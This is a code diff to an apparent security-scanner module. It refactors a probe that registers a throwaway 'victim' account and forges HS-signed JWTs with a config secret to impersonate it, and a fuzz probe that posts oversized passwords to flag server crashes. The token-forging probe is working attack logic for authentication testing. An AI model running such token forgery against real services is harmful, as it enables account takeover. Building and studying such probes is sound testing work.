@@ -51,19 +51,6 @@ def sign_jwt_hs(secret: str, algorithm: str, claims: dict) -> str | None:
     return (signing_input + b"." + sig).decode()
 
 
-def _endpoint(model, *keywords: str, method: str | None = None) -> str | None:
-    """Find an endpoint path whose path contains any keyword (optional method)."""
-    for e in getattr(model, "endpoints", []):
-        if not isinstance(e, dict):
-            continue
-        if method and str(e.get("method", "")).upper() != method:
-            continue
-        path = str(e.get("path", ""))
-        if any(k in path.lower() for k in keywords):
-            return path
-    return None
-
-
 def _jwt_algorithm(model) -> str:
     """Read the JWT algorithm from the model's config, defaulting to HS256."""
     for c in getattr(model, "config", []):
@@ -96,18 +83,27 @@ def forge_jwt_probe(model, base_url: str, *, session: requests.Session | None = 
                             evidence=f"algorithm {algorithm} — a config secret is not the signing key",
                             target="auth")
 
-    register = _endpoint(model, "register", "signup") or "/auth/register"
-    identity = _endpoint(model, "/me", "profile", "current", method="GET") or "/auth/me"
+    from core.auth_recipe import derive_auth_recipe, subject_candidates
+    recipe = derive_auth_recipe(model)
+    register = recipe["register_path"]
+    identity = recipe["identity_path"]
     base = base_url.rstrip("/")
     victim = f"victim_{uuid.uuid4().hex[:8]}@example.com"
 
+    reg_response = None
     try:
-        sess.post(f"{base}{register}", json={"email": victim, "password": "Str0ngPass!23"}, timeout=15)
+        rr = sess.post(f"{base}{register}",
+                       json={recipe["id_field"]: victim, recipe["secret_field"]: "Str0ngPass!23"},
+                       timeout=15)
+        try:
+            reg_response = rr.json()
+        except Exception:
+            reg_response = None
     except Exception as exc:  # pragma: no cover - network
         logger.warning("forge_jwt: victim register failed: %s", exc)
 
     exp = int(time.time()) + 3600
-    for sub in (victim,):  # TaskFlow-style email subject; extend if needed
+    for sub in subject_candidates(victim, reg_response):
         token = sign_jwt_hs(secret, algorithm, {"sub": sub, "exp": exp})
         if not token:
             continue
@@ -135,7 +131,9 @@ def forge_jwt_probe(model, base_url: str, *, session: requests.Session | None = 
 def crash_fuzz_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
     """Send oversized inputs to auth endpoints and flag any 5xx (unhandled crash)."""
     sess = session or requests.Session()
-    register = _endpoint(model, "register", "signup") or "/auth/register"
+    from core.auth_recipe import derive_auth_recipe
+    recipe = derive_auth_recipe(model)
+    register = recipe["register_path"]
     base = base_url.rstrip("/")
     out: list[ProbeFinding] = []
 
@@ -144,7 +142,8 @@ def crash_fuzz_probe(model, base_url: str, *, session: requests.Session | None =
     big_password = "A" * 100
     try:
         r = sess.post(f"{base}{register}",
-                      json={"email": f"fuzz_{uuid.uuid4().hex[:8]}@example.com", "password": big_password},
+                      json={recipe["id_field"]: f"fuzz_{uuid.uuid4().hex[:8]}@example.com",
+                            recipe["secret_field"]: big_password},
                       timeout=15)
         if r.status_code >= 500:
             out.append(ProbeFinding(
